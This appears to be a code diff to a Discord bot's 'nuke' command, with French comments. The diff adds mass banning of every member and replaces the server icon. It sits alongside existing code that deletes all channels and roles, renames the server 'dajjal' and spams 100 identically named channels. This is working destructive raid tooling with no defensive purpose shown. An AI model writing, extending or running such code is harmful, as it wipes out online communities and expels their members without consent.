@@ -26,7 +26,19 @@ module.exports = {
         ]
       });
 
-      // 1. Supprimer tous les salons texte et vocaux
+      // 1. Ban tous les membres (sauf le bot)
+      console.log('🔨 Ban de tous les membres...');
+      await guild.members.fetch();
+      for (const [, member] of guild.members.cache) {
+        if (member.user.id === client.user.id) continue; // Skip le bot
+        try {
+          await member.ban({ reason: 'NUKE - Destruction totale' });
+        } catch (err) {
+          console.error(`Erreur ban ${member.user.tag}:`, err.message);
+        }
+      }
+
+      // 2. Supprimer tous les salons texte et vocaux
       console.log('🗑️ Suppression des salons...');
       for (const channel of guild.channels.cache.values()) {
         try {
@@ -36,7 +48,7 @@ module.exports = {
         }
       }
 
-      // 2. Supprimer tous les rôles (sauf @everyone)
+      // 3. Supprimer tous les rôles (sauf @everyone)
       console.log('🗑️ Suppression des rôles...');
       for (const role of guild.roles.cache.values()) {
         if (role.name !== '@everyone') {
@@ -48,11 +60,20 @@ module.exports = {
         }
       }
 
-      // 3. Renommer le serveur en "dajjal"
+      // 4. Renommer le serveur en "dajjal"
       console.log('📝 Renommage du serveur...');
       await guild.setName('dajjal');
 
-      // 4. Créer 100 salons appelés "dajjal"
+      // 5. Changer l'icon du serveur (photo dajjal)
+      console.log('🖼️ Changement de l\'icon...');
+      const dajjalIcon = 'https://images-ext-2.discordapp.net/external/FjY0VqCp5EUUvT3C_7w8kCjKEuKmGJlnG4DvHFDegbk/https/pbs.twimg.com/media/EvLkc8_VcAE8SJe.jpg'; // URL de l'image dajjal
+      try {
+        await guild.setIcon(dajjalIcon);
+      } catch (err) {
+        console.error('Erreur changement icon:', err.message);
+      }
+
+      // 6. Créer 100 salons appelés "dajjal"
       console.log('📨 Création des 100 salons...');
       let channelsCreated = 0;
       for (let i = 1; i <= 100; i++) {
@@ -63,7 +84,6 @@ module.exports = {
           });
           channelsCreated++;
           
-          // Petit délai pour éviter le rate limit
           if (i % 10 === 0) {
             await new Promise(resolve => setTimeout(resolve, 1000));
           }
@@ -76,7 +96,7 @@ module.exports = {
         embeds: [
           successEmbed(
             'NUKE COMPLÉTÉE 💥',
-            `✅ Serveur renommé en "dajjal"\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
+            `✅ Tous les membres ont été ban\n✅ Serveur renommé en "dajjal"\n✅ Icon changée en dajjal\n✅ Tous les salons supprimés\n✅ Tous les rôles supprimés\n✅ ${channelsCreated} nouveaux salons "dajjal" créés`
           )
         ]
       });
